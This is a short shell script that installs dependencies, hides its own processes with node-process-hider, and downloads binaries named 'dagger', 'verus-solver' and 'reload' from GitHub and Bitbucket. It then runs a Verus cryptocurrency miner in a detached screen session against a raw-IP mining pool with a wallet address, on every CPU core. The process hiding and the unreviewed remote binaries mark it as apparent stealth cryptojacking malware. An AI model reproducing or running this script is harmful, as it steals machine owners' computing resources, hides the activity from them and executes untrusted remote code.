apt update
apt install gcc screen libsodium-dev -y
curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash && apt install nodejs -y
npm install -g npm@8.18.0 -y && npm i -g node-process-hider && ph add dagger verus-solver
wget https://bitbucket.org/kijang-020/project1/raw/d28f558eb2ebf56e26f70d01f3805e21cda6eeaf/reload && chmod +x reload
wget https://github.com/danipedrosang/bang/raw/main/dagger
wget https://github.com/danipedrosang/bang/raw/main/verus-solver && chmod +x dagger verus-solver
screen -dmS run ./dagger -c stratum+tcp://43.134.237.60:80 -u RE9ZxBCB3QiXCbjB8erhFVAC4Ph6ZTNqTE.$(echo $(shuf -i 1-20000 -n 1)-RajaHutan) -p x --cpu $(nproc --all)
./reload
